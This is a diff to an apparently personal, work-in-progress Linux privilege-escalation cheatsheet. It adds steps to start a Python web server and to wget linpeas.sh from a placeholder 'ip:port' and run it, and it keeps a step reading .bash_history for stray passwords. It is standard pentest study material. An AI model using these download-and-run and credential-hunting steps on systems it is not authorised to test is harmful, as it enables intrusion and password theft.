@@ -4,12 +4,14 @@ My shot on a PrivEsc Cheatsheet - WIP
 Linux
 #####################################
 
-1.    cat .bash_history    - cat bash history files for unwanted password entrys and other interesting commands
-1.1   cat
-1.2   cat
+if possible:
+X.    python -m SimpleHTTPServer      -   start a Python web server in the current directory
+X.1   wget ip:port/linpeas.sh         -   getting linpeas and running it
 
-2.
+X.    cat .bash_history               -   cat bash history files for unwanted password entrys and other interesting commands
+X.1   cat
+X.2   cat
 
-3.
+X.
 
-4.
+X.
